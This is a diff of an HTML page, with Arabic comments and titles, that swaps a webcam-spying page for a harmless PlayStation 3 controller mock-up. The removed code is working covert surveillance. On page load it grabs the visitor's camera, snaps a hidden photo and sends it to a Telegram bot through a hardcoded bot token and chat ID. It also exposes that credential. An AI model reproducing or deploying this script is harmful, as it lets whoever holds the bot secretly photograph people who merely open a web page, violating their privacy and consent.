@@ -1,63 +1,115 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <title>ggياحبيبي😂</title>
-  <style>
-    body { font-family: Arial; padding: 20px; }
-    video, canvas { display: block; margin-bottom: 10px; max-width: 100%; }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>يد تحكم بلايستيشن 3</title>
+<style>
+  body {
+    background: #222;
+    color: #eee;
+    font-family: Arial, sans-serif;
+    text-align: center;
+    padding: 20px;
+  }
+  .controller {
+    display: inline-block;
+    background: #333;
+    border-radius: 30px;
+    padding: 40px;
+    width: 400px;
+    box-shadow: 0 0 20px #000;
+    user-select: none;
+  }
+  .button {
+    display: inline-block;
+    margin: 10px;
+    background: #555;
+    width: 60px;
+    height: 60px;
+    line-height: 60px;
+    border-radius: 50%;
+    color: white;
+    font-weight: bold;
+    font-size: 24px;
+    cursor: pointer;
+    transition: background-color 0.2s;
+    box-shadow: 0 0 5px #111 inset;
+  }
+  .button.pressed {
+    background-color: #f00;
+    box-shadow: 0 0 15px #f00;
+  }
+  /* تنظيم الأزرار كما في يد تحكم */
+  .row {
+    margin: 10px 0;
+  }
+  .left-buttons, .right-buttons {
+    display: inline-block;
+    vertical-align: top;
+    width: 45%;
+  }
+  .center-buttons {
+    display: inline-block;
+    width: 10%;
+  }
+</style>
 </head>
 <body>
 
-<video autoplay playsinline></video>
-<canvas style="display:none;"></canvas>
+<h1>يد تحكم بلايستيشن 3</h1>
+<div class="controller">
+
+  <div class="row">
+    <div class="left-buttons">
+      <div class="button" id="btn-l2">L2</div>
+      <div class="button" id="btn-l1">L1</div>
+      <div class="button" id="btn-l3">L3</div>
+    </div>
+    <div class="center-buttons">
+      <div class="button" id="btn-ps">PS</div>
+    </div>
+    <div class="right-buttons">
+      <div class="button" id="btn-r1">R1</div>
+      <div class="button" id="btn-r2">R2</div>
+      <div class="button" id="btn-r3">R3</div>
+    </div>
+  </div>
+
+  <div class="row">
+    <div class="left-buttons">
+      <div class="button" id="btn-dpad-up">▲</div><br />
+      <div class="button" id="btn-dpad-left">◄</div>
+      <div class="button" id="btn-dpad-down">▼</div>
+      <div class="button" id="btn-dpad-right">►</div>
+    </div>
+    <div class="center-buttons">
+      <div class="button" id="btn-select">Select</div><br/><br/>
+      <div class="button" id="btn-start">Start</div>
+    </div>
+    <div class="right-buttons">
+      <div class="button" id="btn-triangle">△</div>
+      <div class="button" id="btn-circle">O</div>
+      <div class="button" id="btn-cross">X</div>
+      <div class="button" id="btn-square">■</div>
+    </div>
+  </div>
+
+</div>
 
 <script>
-  const video = document.querySelector('video');
-  const canvas = document.querySelector('canvas');
-  const botToken = '<7740589813:AAFuxatj_14ycjlVjk7eSmf2jxWvNiQMnIA>';    // حط توكن بوتك هنا
-  const chatId = '<5648499583>';        // حط الـ chat id هنا
-
-  async function startCamera() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      video.srcObject = stream;
-      await new Promise(resolve => video.onloadedmetadata = resolve);
-      
-      // بعد تشغيل الكاميرا، نأخذ صورة ثابتة
-      takePhoto();
-    } catch (err) {
-      console.error('Error accessing camera:', err);
-    }
-  }
-
-  function takePhoto() {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    canvas.toBlob(async (blob) => {
-      // هنا نرسل الصورة للتيليجرام
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('photo', blob, 'photo.jpg');
-
-      try {
-        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        });
-        const data = await response.json();
-        console.log('Telegram response:', data);
-      } catch (error) {
-        console.error('Error sending photo:', error);
-      }
-    }, 'image/jpeg');
-  }
-
-  startCamera();
+  // اضغط زر لتغيير لونه
+  document.querySelectorAll('.button').forEach(button => {
+    button.addEventListener('mousedown', () => {
+      button.classList.add('pressed');
+    });
+    button.addEventListener('mouseup', () => {
+      button.classList.remove('pressed');
+    });
+    button.addEventListener('mouseleave', () => {
+      button.classList.remove('pressed');
+    });
+  });
 </script>
 
 </body>
